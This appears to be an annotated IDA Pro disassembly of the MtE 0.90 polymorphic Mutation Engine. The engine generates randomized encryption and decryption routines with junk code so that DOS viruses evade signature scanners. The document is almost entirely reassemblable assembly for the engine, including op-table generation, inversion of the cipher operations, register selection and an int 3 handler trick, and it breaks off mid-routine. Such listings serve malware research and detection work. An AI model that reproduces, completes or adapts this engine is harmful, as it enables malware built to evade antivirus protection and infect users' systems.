

;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	      Copyright	(c) 2015 Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B611-7234-BB			    |
; |		Doskey Lee, Kingsoft Internet Security Software		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	695E262A067C2034D29D6F2D6EA78E4D
; Input	CRC32 :	F83CE57B

comment	#

in the op table:

0 data
1 start/end
2 pointer
3 sub
4 add
5 xor
6 mul
7 rol
8 ror
9 shl
A shr
B or
C and
D imul
E jnz

when an	argument is 0, the pointer reg will be used instead.

some optimizations are made with add and sub into inc and dec

same for xor reg,-1 into not

structure is as	follows:
1. intro ops, init pointer reg
2. crypt ops
3.
 a. post crypt-ops
 b. inverse of 3a
4. inc/inc ptr,	unless an add/sub op on	the ptr	was adjusted in	3b
5. jnz 2
6. outro ops

#

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Regular
scratch		segment	byte public '' use16
		assume cs:scratch
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
ops		db 21h dup(																																 ?)
ops_args	db 42h dup(																																 ?)
jnz_patch_dec	db 42h dup(																																 ?)
jnz_patch_hits	db 42h dup(																																 ?)
jnz_patch_enc	db 42h dup(																																 ?)
op_idx		db ?
op_free_idx	db ?
op_next_idx	db ?
op_end_idx	db ?
		db ?			; unused byte so we can	move a word into the above
junk_len_mask	db ?
is_8086		db ?			; newer	CPUs mask the shift amount % 32
op_off_patch	dw ?
arg_code_entry	dw ?
arg_flags	dw ?
arg_size_neg	dw ?
arg_exec_off	dw ?
arg_start_off	dw ?
reg_set_dec	db 8 dup(																															       ?) ; 8 bytes, initialised to -1
reg_set_enc	db 8 dup(																															       ?)
ptr_reg		db ?
data_reg	db ?
last_op		db ?			; 0 on single ref routines?
last_op_flag	db ?			; FF uninit; 80	was imm; 40 sub	(need neg); 0 mul; else	reg in imm,imm
patch_dummy	dw ?			; this gets the	patch on single-ref routines
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
		db    ?	;
decrypt_stage	db 200h	dup(																																  ?)
encrypt_stage	db 200h	dup(																																  ?) ; gets called twice, first	for the	junk
					; and then again for the loop
target_start	db 200h	dup(																																  ?)
		db 8A7h	dup(																																  ?)
scratch		ends

; File Name   :	Z:\home\bimfob\mte\MTE.OBJ
; Format      :	Object Module Format (OMF/Microsoft)
; Module name	   : mte.ASM
; Translator	   : Turbo Assembler  Version 2.5
; Dependency	   : 18.08.91 18:30:18 mte.ASM
  MAX_ADD      = 512
  public MAX_ADD		  ; Absolute external value
  MAX_ADD_LEN  = 25
  public MAX_ADD_LEN		  ; Absolute external value
  CODE_LEN     = 2100
  public CODE_LEN		  ; Absolute external value
  MAX_LEN      = 1394
  public MAX_LEN		  ; Absolute external value

; ===========================================================================

; Segment type:	Group
DGROUP		group _DATA,_TEXT

; ===========================================================================

; Segment type:	Externs
; extn03
		extrn RND_INIT:near
		extrn RND_GET:near

; ===========================================================================

; Segment type:	Pure code
_TEXT		segment	word public 'CODE' use16
		assume cs:_TEXT
		;org 10h
		assume es:nothing, ss:nothing, ds:DGROUP, fs:nothing, gs:nothing
		public CODE_START
CODE_START	db 'MtE 0.90á'
		assume es:scratch

; =============== S U B	R O U T	I N E =======================================


		public MUT_ENGINE
MUT_ENGINE	proc near
		cld			; IN
					;
					; es = work segment
					; ds:dx	= code to encrypt
					; cx = length
					; bp = offset of execution
					; di = offset of code entry point
					; si = offset of start address for encrypted code
					; bl = routine size (1,3,7,15)
					; ax = 0..7 preserve regs,
					;      8 will run on different cpu
					;      9 don't assume cs = ds
					;     10 don't assume cs = ss
					;     11 don't align
					;
					; OUT
					;
					; es = work segment
					; ds:dx	= decryption routine + encrypted code
					; cx = length
					; ax = length that was encrypted (MAX_ADD_LEN)
					; di = offset of decryption routine end
					; si = offset of loop start
		push	ds
		push	dx
		push	bp
		call	make_enc_and_dec
		mov	bx, dx
		xchg	ax, bp
		pop	dx
		pop	si
		pop	bp
		sub	bx, di
		push	bx
		push	di
		push	cx
		call	encrypt_target
		pop	cx
		pop	si
		mov	di, offset target_start
		sub	di, cx
		push	di
		push	dx
		rep movsb
		pop	cx
		pop	dx
		pop	si
		sub	cx, dx
		sub	di, dx

get_arg_size:
		mov	ax, ds:arg_size_neg
		neg	ax
		retn
MUT_ENGINE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


; int __cdecl make_enc_and_dec(int argc, const char **argv, const char **envp)
make_enc_and_dec proc near
		push	es
		pop	ds
		assume ds:scratch
		add	cx, 16h
		neg	cx
		and	cl, -2
		jnz	short dont_round_size
		dec	cx
		dec	cx

dont_round_size:
		xchg	ax, di
		mov	arg_code_entry,	ax
		add	ax, cx
		and	al, -2
		jnz	short dont_round_end
		dec	ax
		dec	ax

dont_round_end:
		push	ax
		xchg	ax, di
		mov	di, offset arg_flags
		stosw
		xchg	ax, cx
		stosw
		xchg	ax, bp
		stosw
		xchg	ax, si
		stosw
		mov	cl, 20h		; test for shift 0x1f masking
		shl	cl, cl
		xor	cl, 20h
		mov	(is_8086 - reg_set_dec)[di], cl	; 8086:	0, otherwise 0x20

restart:				; bp = total_end
		pop	bp
		push	bp
		push	bx		; bx = amount of junk to make

		call	RND_INIT	; unusual to srand() multiple times!

		mov	di, offset reg_set_dec ; although di is	initially here,	it won't be the second time around
		mov	cx, 8
		mov	al, -1
		rep stosb

		mov	di, offset decrypt_stage
		mov	bl, 7		; bl=7 for pre-loop junk
		call	make		; generates junk on the	first call
		dec	di		; rewind the retf
		cmp	di, offset decrypt_stage
		jz	short nothing_emitted

		push	dx
		push	di

		push	bp		; bp = end of generated	junk
		mov	ax, 1
		call	exec_enc_stage
		pop	di
		xchg	ax, bp
		stosw			; patch	the "mov reg,imm16"

		pop	di
		pop	dx

nothing_emitted:
		pop	bx
		pop	ax
		xor	bp, bp

make:
		push	ax
		push	bx

		push	dx
		push	di		; save pointer into decrypt_stage

		xor	ax, ax
		mov	di, offset jnz_patch_dec
		mov	cx, di		; 0x63
		rep stosw

		mov	al, 4		; don't assume cs == ss, needed for the staged encryption
		xchg	al, byte ptr (arg_flags+1 - 129h)[di]
		push	ax		; save old flags

		mov	dx, (arg_size_neg - 129h)[di]
		mov	di, offset encrypt_stage
		push	bp
		call	g_code		; make encrypter
		pop	bp

		call	invert_ops
		pop	ax

		pop	di		; get the pointer into decrypt_stage back
		pop	dx

		mov	byte ptr arg_flags+1, al
		and	al, 1		; run on diff cpu?
		sub	is_8086, al	; 8086:	0, otherwise 0x20
		push	ax
		call	g_code_from_ops	; make decrypter
		pop	ax		; flags
		add	(is_8086 - 14Ch)[si], al ; restore val

		xchg	ax, bx
		pop	bx
		sub	ax, offset patch_dummy ; ax is the second patch	point; 0 if g_code failed; 0xff00 if we	should loop
		jb	short restart	; loop
		jnz	short done	; single ref
		cmp	(arg_start_off - 14Ch)[si], ax
		jnz	short restart

done:
		pop	bx
		retn
make_enc_and_dec endp


; =============== S U B	R O U T	I N E =======================================


encrypt_target	proc near
		add	cx, dx
		mov	dx, di
		xchg	ax, di
		mov	ax, arg_code_entry
		test	ax, ax
		jnz	short entry_not_zero
		mov	di, offset target_start

entry_not_zero:
		mov	bx, offset decrypt_stage

		push	cx
		push	ax

fix_pop_loop:
		cmp	bx, dx
		jz	short emit_jump

		dec	bx
		mov	al, [bx]
		xor	al, 1
		cmp	al, 61h		; popa
		jz	short dont_flip
		xor	al, 9		; re-flip 1, flip 8 (50..57 -> 58..5f)

dont_flip:
		stosb
		inc	cx
		jmp	short fix_pop_loop

emit_jump:
		pop	dx
		pop	ax

		mov	bx, offset patch_dummy

		test	dx, dx
		jz	short emit_align_nops

		xchg	ax, cx
		mov	al, 0E9h
		stosb
		mov	bx, di
		xchg	ax, dx
		stosw
		mov	di, offset target_start

emit_align_nops:			; align?
		test	byte ptr arg_flags+1, 8
		jnz	short no_align

		neg	cx
		and	cx, 0Fh
		mov	al, 90h		; nop padding
		rep stosb

no_align:
		lea	ax, target_start[di]
		add	[bx], ax
		and	al, -2
		add	arg_size_neg, ax
		call	get_arg_size
		mov	ds, bp
		assume ds:DGROUP
		shr	ax, 1
		mov	cx, ax
		rep movsw

exec_enc_stage:
		push	di
		push	ax

		xor	cx, cx
		mov	ds, cx
		assume ds:nothing
		mov	cx, cs
		mov	bx, offset int_3_handler
		mov	di, 0Ch		; 3*4
		cli
		xchg	cx, [di+2]
		xchg	bx, [di]
		sti

		push	cx
		push	bx
		push	di
		push	ds

		push	es
		pop	ds
		assume ds:scratch
		push	cs
		mov	bx, offset encrypt_stage
		call	jmp_es_bx	; switch control to the	generated encryptor
		xchg	ax, bp		; set bp to the	result of the junk's ax
		pop	es
		assume es:nothing
		pop	di

		cli
		pop	ax
		stosw
		pop	ax
		stosw
		sti

		pop	bx		; caller's ax
		push	ds
		pop	es
		assume es:scratch
		mov	di, offset jnz_patch_dec
		xor	si, si
		mov	cx, 21h

find_next_fill:
		xor	ax, ax
		repe scasw
		jz	short pop_dx_ret ; no fill required
		mov	ax, word ptr (jnz_patch_dec - (jnz_patch_dec+2))[di]
		cmp	ax, si
		jb	short find_next_fill
		mov	dx, 1
		xchg	ax, si
		mov	ax, word ptr (jnz_patch_hits - (jnz_patch_dec+2))[di]
		cmp	ax, bx
		jz	short fill_loop
		or	ax, ax
		jnz	short find_next_fill
		lodsb			; grab jnz offset
		cbw
		xchg	ax, dx

fill_loop:				; junk [si] with dx count
		call	RND_GET
		mov	[si], al
		inc	si
		dec	dx
		jnz	short fill_loop
		jmp	short find_next_fill

jmp_es_bx:
		push	es
		push	bx
		retf

pop_dx_ret:
		pop	dx
		retn
encrypt_target	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; test reg,reg
; jcc ...<- CC gets encoded @ the jump
; Attributes: bp-based frame

int_3_handler	proc far
		push	bp		; test reg,reg
					; int 3
					; db offset_to_skip
		mov	bp, sp
		push	di
		push	cx
		push	bx
		push	ax
		mov	bx, [bp+2]	; caller's return addr
		mov	al, [bx]	; get jump offset
		jnz	short branch_taken ; test reg,reg
		xchg	ax, bx
		mov	di, offset jnz_patch_enc
		mov	cx, 21h
		repne scasw
		inc	word ptr (jnz_patch_hits - (jnz_patch_enc+2))[di]
		mov	al, ch		; set to zero, don't jump

branch_taken:
		cbw
		inc	ax
		add	[bp+2],	ax
		pop	ax
		pop	bx
		pop	cx
		pop	di
		pop	bp
		iret
int_3_handler	endp


; =============== S U B	R O U T	I N E =======================================


make_ops_table	proc near
		mov	di, offset op_idx ; set	the three pointers into	ops
		mov	ax, 0101h
		stosb
		stosw
		mov	ah, 81h
		mov	word ptr ops, ax ; [ops] = 1,81

make_ops_loop:
		call	RND_GET
; ^ argument for op.  also decides the op
; i.e. 5,11,1d,29,35,41,4d => xor [ptr+off]
;      d,19,25,31,3d,49,55 => sub [ptr+off] + neg [ptr+off]
;      f,1b,27,33,3f,4b,47 => add [ptr+off] (enc)
;
; add [ptr+off],arg will be inverted as	a
;   mov	reg,[ptr+off]
;   sub	reg,arg
;
; 0x20 makes a zero op routine,	but has	the load and store
;
		xchg	ax, dx
		call	RND_GET
; ^ amount of ops
		mov	bl, (op_next_idx - 12Ch)[di]
		xor	bh, bh
		mov	si, bx
		mov	cx, [si-1]
		cmp	ch, 6		; currently mul?
		jnz	short not_mul

make_arg_odd:				; needs	to be odd for gcd
		or	dl, 1
		jmp	short loc_10229

not_mul:
		cmp	ch, 86h
		jnz	short not_mul2
		xor	cl, cl
		inc	bx

not_mul2:
		and	al, (junk_len_mask - 12Ch)[di]
		cmp	al, bl
		jnb	short pick_op	; made enough ops?

		shr	bl, 1
		jnb	short loc_10229
		or	cl, cl		; cl = last op
		jz	short last_op

loc_10229:				; 1 in 256
		or	dl, dl

last_op:				; data
		mov	al, 0
		jnz	short save_op_idx
		or	bp, bp
		jnz	short make_arg_odd
		mov	al, 2		; ptr

save_op_idx:
		or	ch, ch
		jns	short more_ops
		mov	word ptr (op_end_idx - 12Ch)[di], si
		mov	al, 1		; end

more_ops:
		mov	ops[si], al
		jmp	short sto_arg_loop

pick_op:				; ax = rand
		xchg	ax, dx
		aam	12		; al = al % 12
		and	ch, 80h		; final	op flag?
		jz	short not_crypt_ops
		shr	al, 1		; al = [0,5], which later becomes [3,8]	at the next step
					; i.e. sub, add, xor, mul, rol,	ror

not_crypt_ops:
		inc	ax
		inc	ax
		inc	ax
		mov	ah, al		; al = [3,14]
		mov	ops[si], al
		mov	dl, (op_free_idx - 12Ch)[di]
		inc	dx
		mov	dh, dl
		inc	dh
		mov	(op_free_idx - 12Ch)[di], dh
		mov	bl, dl
		mov	bh, 0
		mov	cl, bh		; bh = cl = 0
		jnb	short switch_args ; XXX	50/50 when doing crypt ops (c set from the shr above)
					; this is how single-ref routines are created
		cmp	al, 6
		jb	short sto_op	; [3,6)	= sub,add,xor

switch_args:
		xchg	cl, ch

sto_op:
		xor	ax, cx
		mov	word ptr ops[bx], ax

sto_arg_loop:
		shl	si, 1
		mov	word ptr ops_args[si], dx
		inc	(op_next_idx - 12Ch)[di]
		mov	al, (op_free_idx - 12Ch)[di]
		cmp	al, (op_next_idx - 12Ch)[di]
		jb	short _ret
		jmp	make_ops_loop
make_ops_table	endp


; =============== S U B	R O U T	I N E =======================================


encode_mrm_beg	proc near
		dec	bp

encode_mrm:				; dh signed -> bl_op_reg_mrm
		or	dh, dh
		jns	short bl_op_reg_mrm ; MRM is reg,imm

encode_mrm_ptr:
		mov	dh, (ptr_reg - 14Ch)[si]
		inc	bp
		jz	short encode_mrm_beg
		dec	bp
		jnz	short loc_102C3

		push	bx
		mov	bx, (offset mrm_byte - 3)
		xchg	al, dh
		xlat	byte ptr cs:[bx]
		cmp	al, 86h		; bp+off16?
		xchg	al, dh
		xchg	ax, bx
		mov	cl, 2Eh		; cs: prefix
		mov	al, byte ptr arg_flags+1
		jnz	short ptr_is_bp
		test	al, 2		; cs ==	ds?
		jnz	short assume_ds
		mov	cl, 3Eh		; ds: prefix

assume_ds:				; cs ==	ss?
		test	al, 4
		jmp	short do_seg_override

ptr_is_bp:
		test	al, 4
		jnz	short assume_ss
		mov	cl, 36h		; ss: prefix

assume_ss:
		test	al, 2

do_seg_override:
		jz	short no_override
		mov	al, cl
		stosb

no_override:
		pop	ax
		call	encode_op_mrm	; al = op, bl =	reg, dh	= rm
		mov	(op_off_patch -	14Ch)[si], di
		stosw

_ret:
		retn

loc_102C3:
		mov	dx, bp
		lea	bp, [di+1]

stc_ret:
		stc
		retn
mrm_byte:				; bx, (res byte	for sp), bp, si, di
		db  87h,   0, 86h, 84h,	85h
		db 7Dh			; unused?
		db 4Ah			; unused?
encode_mrm_beg	endp


; =============== S U B	R O U T	I N E =======================================

; skip op if dh	is signed

encode_mrm_dh_s	proc near
		or	dh, dh
		js	short encode_mrm_ptr

emit_op_mrm:
		cmp	dh, al
		jz	short _ret	; dont op on the same reg

		cmp	(is_8086 - 14Ch)[si], 0FFh ; 8086: 0, otherwise	0x20
		jnz	short bl_op_reg_mrm ; MRM is reg,imm

		push	ax
		or	dh, dh
		jz	short loc_102EA
		or	al, al
		jnz	short bl_op_reg_mrm_
		mov	al, dh

loc_102EA:
		or	bp, bp
		jnz	short do_xchg
		cmp	al, (ptr_reg - 14Ch)[si]
		jz	short bl_op_reg_mrm_

do_xchg:
		pop	bx
		or	al, 90h
		stosb
		retn

bl_op_reg_mrm_:
		pop	ax

bl_op_reg_mrm:				; 0xc0 >> 3
		or	al, 00011000b
		xchg	ax, bx

encode_op_mrm:				; al = op, bl =	reg, dh	= rm
		stosb
		xchg	ax, bx
		mov	cl, 3
		shl	al, cl
		or	al, dh
		stosb
		retn
encode_mrm_dh_s	endp


; =============== S U B	R O U T	I N E =======================================


get_op_loc	proc near
		mov	bx, ax
		shr	al, 1
		mov	cx, ax
		shl	cx, 1
		mov	di, (offset ops_args+2)

again:
		repne scasb
		jnz	short stc_ret
		lea	si, (ops - (ops_args+1))[di]
		shr	si, 1
		cmp	byte ptr [si], 3 ; non-op?
		jb	short again
		lea	ax, (ops - (ops_args+1))[di]
		retn
get_op_loc	endp


; =============== S U B	R O U T	I N E =======================================


invert_ops	proc near
		mov	al, op_end_idx
		cbw
		shl	al, 1
		call	get_op_loc
		jb	short _ret
		mov	op_idx,	al

again:
		call	get_op_loc
		jnb	short not_marker
		xor	al, al

not_marker:
		push	ax
		shr	al, 1
		mov	ops_args[bx], al
		shr	bl, 1
		lahf
		mov	al, ops[bx]
		and	al, 7Fh
		cmp	al, 3
		jnz	short not_sub
		sahf
		jb	short done
		inc	ax		; 3 -> 4, sub -> add
		jmp	short store

not_sub:				; add
		cmp	al, 4
		jnz	short maybe_mul
		sahf
		jnb	short dec_store	; nc ->	change to sub
		mov	si, bx
		mov	cl, 8
		rol	word ptr ops_args[bx+si], cl ; XXX change arg order?

dec_store:
		dec	ax
		jmp	short store

maybe_mul:
		cmp	al, 6
		jb	short done
		jnz	short toggle_rotate

; set arg to the multiplicative	inverse

		shl	bl, 1
		mov	bl, (ops_args+1)[bx]
		shl	bl, 1
		mov	si, word ptr ops_args[bx]
		xor	ax, ax
		mov	dx, 1
		mov	cx, ax
		mov	di, dx

gcd_loop:
		mov	word ptr ops_args[bx], di
		dec	si
		jz	short done
		inc	si
		div	si
		push	dx
		mul	di
		sub	cx, ax
		xchg	cx, di
		mov	ax, si
		xor	dx, dx
		pop	si
		jmp	short gcd_loop

toggle_rotate:				; toggle 7/8.  rol and ror
		xor	al, 0Fh

store:
		mov	ops[bx], al

done:
		pop	ax
		or	al, al
		jnz	short again
		shr	op_idx,	1

_ret:
		retn
invert_ops	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


g_code		proc near
		mov	junk_len_mask, bl

g_code_no_mask:
		push	dx
		push	di
		call	make_ops_table
		pop	di
		pop	dx

g_code_from_ops:
		push	di

		mov	di, offset reg_set_enc
		mov	ax, -1
		stosw			; ax and cx available
		inc	al
		stosw			; dx unavailable bx available
		stosw			; sp unavailable bp available
		dec	al
		stosw			; si and di available
		mov	(last_op_flag -	14Ch)[di], al ;	FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
		mov	bl, (op_idx - 14Ch)[di]

		push	bx
		push	dx
		call	get_op_args	; bl = idx to op
		mov	si, di		; si = 0x14c
		call	ptr_and_r_sto	; pick a pointer and data reg
		pop	dx
		pop	bx

		pop	di

; bp = size_neg	=> intro junk
;      1	=> making loop
;      0	=> making decrypter loop end+outro
;     -1	=> only	when called recursively?

		push	bx
		inc	bp
		jz	short making_junk
		dec	bp
		jnz	short do_intro_garbage
		inc	bp

making_junk:
		dec	bp
		inc	dx		; when dx = -1 we're making outro junk
		jz	short no_mov
		dec	dx
		dec	bp
		mov	al, (ptr_reg - 14Ch)[si] ; al =	index register
		call	emit_mov	; writes out the mov index,size_neg
		inc	bp

no_mov:
		pop	bx
		push	di
		call	emit_ops
		or	bp, bp
		jnz	short not_dec_end
		pop	cx
		dec	bp
		mov	ax, offset patch_dummy
		xchg	ax, (op_off_patch - 14Ch)[si]
		or	dh, dh
		js	short maybe_null
		inc	bp
		push	cx
		push	ax
		mov	al, (last_op_flag - 14Ch)[si] ;	FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
		and	al, 10110111b
		cmp	al, 10000111b
		jnz	short do_end_of_loop
		cmp	bp, (arg_start_off - 14Ch)[si] ; start off is zero?
		jnz	short do_end_of_loop

; sub/neg routine
		xor	byte ptr [di-4], 2 ; change the	direction of the op
		shl	(last_op_flag -	14Ch)[si], 1 ; FF uninit; 80 was imm; 40 sub (need neg); 0 mul;	else reg in imm,imm
		jns	short single_ref
		mov	bl, 0F7h	; f7 series op
		mov	al, 3		; NEG
		jmp	short emit_eol_bl

maybe_null:
		cmp	cx, (offset decrypt_stage+3)
		jnz	short not_null

; only encoded a mov, rewind
		sub	cx, 3
		sub	di, 3
		mov	bl, (ptr_reg - 14Ch)[si]
		xor	bh, bh
		dec	(reg_set_dec - 14Ch)[bx+si]

not_null:
		mov	bx, offset patch_dummy
		jmp	short size_ok

not_dec_end:
		or	dh, dh
		jns	short making_enc
		mov	dh, [si]
		jmp	short making_enc

do_intro_garbage:
		push	bp
		call	emit_ops
		mov	al, (data_reg -	14Ch)[si]
		or	al, 90h
		stosb
		pop	ax
		or	dh, dh
		jns	short making_enc
		xchg	ax, dx		; dx = size neg

making_enc:
		pop	ax
		mov	bh, 0FFh

encode_retf:
		mov	byte ptr [di], 0CBh
		retn

; encode store,	inc, and jnz

do_end_of_loop:
		call	RND_GET
		and	al, 2
		add	al, 87h		; mov or xchg
		xchg	ax, bx
		mov	al, dh
; when we're negging

emit_eol_bl:
		call	encode_mrm_ptr

single_ref:
		mov	al, (ptr_reg - 14Ch)[si]
		cmp	di, offset encrypt_stage
		jnb	short emit_inc

; post crypt ops junk in the decrypter.	 we generate ops, and then generate the	inverse.
		push	ax
		dec	bp
		xor	dl, dl
		mov	dh, al
		shr	(junk_len_mask - 14Ch)[si], 1 ;	patch here with	"mov [si-1e],dl" for no	junk

		call	g_code_no_mask

		push	dx
		push	di
		call	invert_ops
		call	try_ptr_advance	; returns -1 in	cx if an add/sub ptr was found (and adjusted)
		pop	di
		pop	dx

		push	cx
		call	g_code_from_ops
		pop	cx

		pop	ax
		call	emit_mov	; restore reg

		or	ch, ch
		js	short emit_jnz	; sub ptr,regval-2 | add ptr,regval+2 style

emit_inc:
		or	al, 40h
		stosb
		stosb

emit_jnz:
		mov	al, 75h
		stosb
		pop	bx
		pop	ax
		mov	cx, ax
		sub	ax, di
		dec	ax
		stosb
		or	al, al
		js	short size_ok

; too big
		xor	bx, bx
		retn

size_ok:
		call	encode_retf
		push	cx
		mov	dx, offset target_start
		cmp	di, offset encrypt_stage
		jnb	short patch_offsets ; don't need to make junk and pushes for encrypter

; more junk, post loop
		push	bx
		mov	bl, 7		; junk-o-meter
		mov	dx, bp
		call	g_code

; emit pushes before the decrypter, if required
		push	di
		mov	di, (offset decrypt_stage - 1)
		xor	bx, bx
		mov	dx, di
		mov	cl, byte ptr (arg_flags	- 14Ch)[si] ; grab the reg save	bitfield from args

emit_push_loop:
		shr	cl, 1
		pushf
		jnb	short dont_emit_push ; save requested?
		cmp	bh, (reg_set_dec - 14Ch)[bx+si]
		jnz	short dont_emit_push ; was it actually used?
		lea	ax, [bx+50h]	; push
		std
		stosb

dont_emit_push:
		inc	bx
		popf
		jnz	short emit_push_loop
		inc	di
		cmp	di, dx
		jnb	short pushes_done
		cmp	bh, (is_8086 - 14Ch)[si] ; 8086: 0, otherwise 0x20
		jnz	short cant_pusha
		mov	di, dx
		mov	byte ptr [di], 60h ; pusha
		jmp	short pushes_done

cant_pusha:
		push	di

randomize_pushes:
		call	RND_GET
		and	al, 7
		cbw
		xchg	ax, bx
		add	bx, di
		cmp	bx, dx
		ja	short randomize_pushes
		mov	al, [di]
		xchg	al, [bx]
		stosb
		cmp	di, dx
		jnz	short randomize_pushes
		pop	di

pushes_done:
		pop	bp
		mov	cx, bp
		sub	cx, di
		cmp	(arg_code_entry	- 14Ch)[si], 0
		jz	short entry_is_zero
		add	cx, (offset decrypt_stage+3) ; adjust for code entry not 0
		sub	cx, di

entry_is_zero:
		mov	dx, (arg_exec_off - 14Ch)[si]
		mov	ax, dx
		add	dx, cx
		add	ax, (arg_start_off - 14Ch)[si]
		pop	bx
		cmp	(arg_start_off - 14Ch)[si], 0
		jnz	short use_start_off

patch_offsets:
		mov	ax, dx

use_start_off:
		call	patch
		xchg	ax, dx
		pop	dx
		mov	bx, (op_off_patch - 14Ch)[si]

patch:
		sub	ax, (arg_size_neg - 14Ch)[si]
		mov	[bx], ax
		retn
g_code		endp


; =============== S U B	R O U T	I N E =======================================

; returns -1 in	cx if an add/sub ptr was found (and adjusted)

try_ptr_advance	proc near
		xor	cx, cx
		mov	al, op_idx
		cbw
		xchg	ax, bx
		mov	dx, -2		; -2
		mov	al, ops[bx]
		cmp	al, 3		; sub?
		jz	short is_sub
		cmp	al, 4		; add?
		jnz	short done
		neg	dx		; 2

is_sub:
		shl	bl, 1
		push	bx
		inc	bx
		call	fix_arg
		pop	bx
		mov	dx, 2

fix_arg:
		mov	bl, ops_args[bx]
		cmp	bh, ops[bx]	; op ==	0?
		jnz	short done
		mov	si, bx
		add	dx, word ptr ops_args[bx+si]
		or	dl, dl
		jz	short done
		mov	word ptr ops_args[bx+si], dx
		dec	cx

done:
		retn
try_ptr_advance	endp


; =============== S U B	R O U T	I N E =======================================

; bl = idx to op

get_op_args	proc near
		xor	bh, bh
		and	ops[bx], 7Fh
		mov	dl, ops[bx]	; dl = op
		mov	ax, bx
		shl	bl, 1
		mov	bx, word ptr ops_args[bx]

		cmp	dl, 3		; < 3?	not an op
		jb	short _ret

		push	ax
		push	bx
		call	get_op_args	; bl = idx to op
		pop	bx
		mov	bl, bh
		push	dx
		call	get_op_args	; bl = idx to op
		xchg	ax, bx
		pop	cx
		pop	bx

		mov	dh, ops[bx]
		sub	dh, 0Dh		; 0xd -> imul
		jz	short is_mul
		add	dh, 7		; 0x6 -> mul
		jnz	short not_mul

is_mul:					; FF uninit; 80	was imm; 40 sub	(need neg); 0 mul; else	reg in imm,imm
		mov	(last_op_flag -	14Ch)[di], dh
		mov	(reg_set_dec+2 - 14Ch)[di], dh ; dx
		jmp	short not_rotate

not_mul:				; >= 0xb ?
		cmp	dh, 5
		jnb	short not_rotate
		or	dl, dl
		jnz	short need_cx
		cmp	dl, (is_8086 - 14Ch)[di] ; 8086: 0, otherwise 0x20
		jz	short not_rotate

		sub	al, 0Eh		; al = last in the op 3-tuple?
		and	al, 0Fh
		cmp	al, 5		; op >=	7?
		jnb	short need_cx
		cmp	al, 2		; op >=	4?
		jnb	short not_rotate

		cmp	dh, 3		; < 0x9?
		jb	short not_rotate

need_cx:				; cx
		mov	(reg_set_dec+1 - 14Ch)[di], bh
		mov	dl, 80h

not_rotate:
		or	dl, cl
		and	dl, 80h
		or	dl, ops[bx]
		mov	ops[bx], dl

_ret:
		retn
get_op_args	endp


; =============== S U B	R O U T	I N E =======================================


ptr_and_r_sto	proc near
		call	pick_ptr_reg
		call	RND_GET
		and	al, 7
		jz	short mark_and_emit
		xor	al, al
		cmp	al, (last_op_flag - 14Ch)[si] ;	FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
		jz	short mark_and_emit

pick_ptr_reg:
		call	RND_GET
		and	al, 3
		jnz	short not_di
		mov	al, 7

not_di:					; 3, 5,	6, 7
		xor	al, 4

mark_and_emit:
		cbw
		mov	bx, ax
		xchg	bh, (reg_set_enc - 14Ch)[bx+si]
		or	bh, bh		; already used?
		jz	short pick_ptr_reg
		stosb

_ret_0:
		retn
ptr_and_r_sto	endp


; =============== S U B	R O U T	I N E =======================================


emit_ops	proc near
		mov	word ptr (last_op - 14Ch)[si], 80FFh ; last_op=ff, last_op_flag=80
		xor	bh, bh
		mov	al, ops[bx]
		and	ax, 7Fh
		shl	bl, 1
		mov	dx, 0FF00h

		dec	ax
		jz	short _ret_0	; 1?  start/end
		mov	dh, (ptr_reg - 14Ch)[si]
		dec	ax
		jz	short _ret_0	; 2? mov aux,ptr
		mov	dx, word ptr ops_args[bx]
		js	short _ret_0	; 0? mov aux,imm16

		push	ax
		push	dx
		push	bx
		mov	bl, dh
		call	emit_ops
		pop	bx
		pop	cx
		pop	ax
		cmp	al, 0Ch		; 0xE? jnz op
		jnz	short op_not_jnz
		or	dl, dl
		jnz	short _ret_0
		cmp	dh, (ptr_reg - 14Ch)[si]
		jz	short _ret_0
		push	ax
		push	cx
		push	bx
		push	dx
		call	emit_mov_data
		pop	dx
		mov	ax, word ptr (data_reg - 14Ch)[si] ; picks up last_op too
		cmp	dh, al
		jnz	short encode_test
		or	ah, ah
		jz	short encode_jnz

encode_test:				; test
		mov	bl, 85h
		call	bl_op_reg_mrm	; MRM is reg,imm

encode_jnz:
		pop	bx
		mov	al, 75h		; jnz
		stosb
		inc	bp
		jz	short dont_record
		cmp	di, offset encrypt_stage
		jb	short in_decrypt
		add	byte ptr [di-1], 57h ; encode int 3.  deliberately obscure, mov	is the same length

in_decrypt:
		mov	ax, di
		xchg	ax, word ptr jnz_patch_dec[bx]
		mov	word ptr jnz_patch_enc[bx], ax

dont_record:
		dec	bp
		inc	di
		mov	dx, di
		jmp	short store_data_reg

op_not_jnz:
		push	ax
		push	cx

		or	dl, dl
		jnz	short store_data_reg

		cmp	dh, (data_reg -	14Ch)[si] ; are	we working on the data register?
		jnz	short store_data_reg

		mov	al, (last_op_flag - 14Ch)[si] ;	FF uninit; 80 was imm; 40 sub (need neg); 0 mul; else reg in imm,imm
		or	al, al
		js	short pick_reg	; higher series	ops
		and	al, 7
		jz	short change_direction
		cmp	al, (ptr_reg - 14Ch)[si]
		jz	short pick_reg
		cmp	al, 3
		jb	short pick_reg	; pick_reg if ax/cx/dx

change_direction:			; 03, 0b, 23, 2b, 33
		xor	byte ptr [di-2], 2

		test	(last_op_flag -	14Ch)[si], 40h ; FF uninit; 80 was imm;	40 sub (need neg); 0 mul; else reg in imm,imm
		jz	short mark_reg_used ; routine isn't sub

		push	ax		; encode neg reg
		or	al, 11011000b
		mov	ah, al
		mov	al, 0F7h
		stosw
		pop	ax

		jmp	short mark_reg_used

pick_reg:
		call	RND_GET
		mov	cx, 8

pick_loop:
		push	ax
		mov	al, dh
		or	al, 50h		; push
		stosb
		pop	ax
		mov	bl, 80h
		jcxz	short push_instead
		dec	di		; rewind
		dec	cx
		inc	ax
		and	al, 7
		cbw
		mov	bx, ax
